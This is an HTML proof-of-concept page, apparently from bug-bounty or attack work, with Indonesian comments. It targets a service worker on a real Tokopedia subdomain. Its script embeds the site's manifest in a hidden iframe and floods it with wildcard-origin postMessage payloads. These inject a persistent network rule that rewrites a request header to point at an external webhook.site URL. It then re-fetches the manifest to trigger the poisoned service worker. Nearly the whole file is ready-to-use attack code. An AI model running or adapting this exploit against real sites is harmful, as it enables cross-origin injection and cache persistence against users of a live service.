<!DOCTYPE html>
<html>
<head>
    <title>Verification System</title>
</head>
<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
    <div style="border: 1px solid #0f0; display: inline-block; padding: 20px;">
        <h1 id="status">[ PHASE 1: TARGETING ]</h1>
        <p id="sub-status">Locating vulnerable Service Worker scope...</p>
    </div>

    <iframe id="pwn_gate" 
            src="https://shop-id.tokopedia.com/manifest.json" 
            style="display:none;"></iframe>

    <script>
        const gate = document.getElementById('pwn_gate');
        const statusH1 = document.getElementById('status');
        const statusP = document.getElementById('sub-status');
        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI ID LU

        const payload = {
            source: "main_thread",
            eventName: "network_rule",
            data: [{
                ruleName: "final_pwn_stable",
                global: true,
                conditions: [],
                handlers: [{
                    handler: "replace",
                    type: "header",
                    field: "X-Pns-Referrer",
                    value: webhook
                }]
            }]
        };

        gate.onload = function() {
            statusH1.innerText = "[ PHASE 2: INJECTING ]";
            statusP.innerText = "Bypassing Origin Restrictions...";

            // 1. Kirim pesan aktivasi
            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*");

            setTimeout(() => {
                // 2. Tembakkan payload inti
                let count = 0;
                const bomb = setInterval(() => {
                    gate.contentWindow.postMessage(payload, "*");
                    count++;
                    if (count > 50) {
                        clearInterval(bomb);
                        statusH1.innerText = "[ PHASE 3: PERSISTING ]";
                        statusP.innerText = "Syncing with Cache Storage (10s)...";
                        
                        // 3. Jeda lebih lama (10 detik) untuk memastikan penulisan cache selesai
                        setTimeout(verifyAndTrigger, 10000);
                    }
                }, 100);
            }, 1000);
        };

        function verifyAndTrigger() {
            statusH1.innerText = "[ PHASE 4: TRIGGERING ]";
            statusP.innerText = "Executing intercept request...";
            
            // 4. Trigger fetch ke manifest lagi agar diintersep oleh SW yang sudah terinfeksi
            fetch("https://shop-id.tokopedia.com/manifest.json", { 
                mode: 'no-cors',
                cache: 'no-store' 
            }).then(() => {
                statusH1.innerText = "[ COMPLETED ]";
                statusP.innerText = "Check Reqable for X-Pns-Referrer on manifest.json";
                console.log("PoC Finished.");
            });
        }
    </script>
</body>
</html>
